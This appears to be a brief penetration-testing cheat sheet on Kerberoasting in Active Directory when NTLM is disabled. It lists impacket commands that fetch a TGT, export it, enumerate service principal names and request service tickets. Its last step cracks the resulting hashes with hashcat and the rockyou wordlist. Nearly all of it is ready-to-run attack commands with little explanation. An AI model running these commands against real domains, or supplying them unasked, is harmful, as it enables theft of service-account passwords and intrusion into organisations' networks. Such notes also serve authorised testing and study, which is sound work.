# NTLM disabled and working with Kerberos TGT/TGS
TGT is coupon code for buing a ticket in the cinema

TGS is a ticket for specific movie in the cinema

**In kerberos use hostname instead of IP address**

- Get TGT
```
impacket-gettgt domain.local/username:password
```
- Export ticket
```
export KRB5CCNAME=tgtticketfile.cache
```
- Verify by:
```
klist
```
- Get User SPNs
```
impacket-getuserspns domain.local/username:password -dc-host dc01.domain.local -k -no-pass
```
```
impacket-getuserspns domain.local/username:password -dc-host dc01.domain.local -k -no-pass -request
```
- Crack hash
```
hashcat hash.txt rockyou.txt
```

